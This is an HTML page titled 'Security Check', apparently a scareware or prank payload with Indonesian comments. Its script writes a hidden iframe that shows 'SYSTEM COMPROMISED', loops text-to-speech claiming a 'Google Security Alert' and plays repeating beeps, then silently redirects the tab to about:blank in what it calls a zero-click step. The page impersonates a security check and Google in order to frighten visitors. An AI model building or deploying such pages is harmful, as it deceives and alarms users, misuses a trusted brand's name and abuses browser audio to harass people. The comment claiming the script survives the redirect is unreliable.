=<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
</head>
<body>
<script>
(function () {
  'use strict';

  // ============================================
  // 1. PERSIAPAN PAYLOAD UNTUK ABOUT:BLANK
  // ============================================
  var payloadHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>System Alert</title></head>
    <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
      <h1>SYSTEM COMPROMISED</h1>
      <p id="status">Mencoba memutar suara...</p>
      <script>
        (function() {
          var statusEl = document.getElementById('status');

          // A. TTS Loop
          if ('speechSynthesis' in window) {
            var count = 0;
            function speak() {
              var u = new SpeechSynthesisUtterance("Google Security Alert. System compromised. Loop number " + count);
              u.lang = 'en-US';
              u.rate = 1.0;
              u.volume = 1.0;
              
              u.onstart = function() { statusEl.innerText = "TTS Running: " + count; };
              u.onend = function() {
                count++;
                setTimeout(speak, 1000); // Loop tiap 1 detik
              };
              window.speechSynthesis.speak(u);
            }
            speak();
          }

          // B. AudioContext Beep Loop
          try {
            var ctx = new (window.AudioContext || window.webkitAudioContext)();
            if (ctx.state === 'suspended') ctx.resume();
            
            setInterval(function() {
              var osc = ctx.createOscillator();
              osc.type = 'sine';
              osc.frequency.value = 880;
              osc.connect(ctx.destination);
              osc.start();
              osc.stop(ctx.currentTime + 0.2); // Beep pendek
            }, 2000);
          } catch(e) {}

        })();
      <\/script>
    </body>
    </html>
  `;

  // ============================================
  // 2. EKSEKUSI ZERO-CLICK REDIRECT
  // ============================================
  console.log("[!] Memulai Zero-Click Redirect ke about:blank...");

  // Gunakan iframe tersembunyi untuk menyimpan script,
  // lalu redirect tab utama ke about:blank.
  // Ini memastikan script tetap berjalan setelah redirect.
  
  var iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  // Tulis payload ke iframe (sebagai jembatan)
  try {
    var doc = iframe.contentDocument || iframe.contentWindow.document;
    doc.open();
    doc.write(payloadHTML);
    doc.close();
  } catch (e) {
    console.log("Iframe error:", e);
  }

  // Lakukan Redirect Tab Utama ke about:blank
  setTimeout(function() {
    window.location.replace('about:blank');
  }, 100);

})();
</script>
</body>
</html>
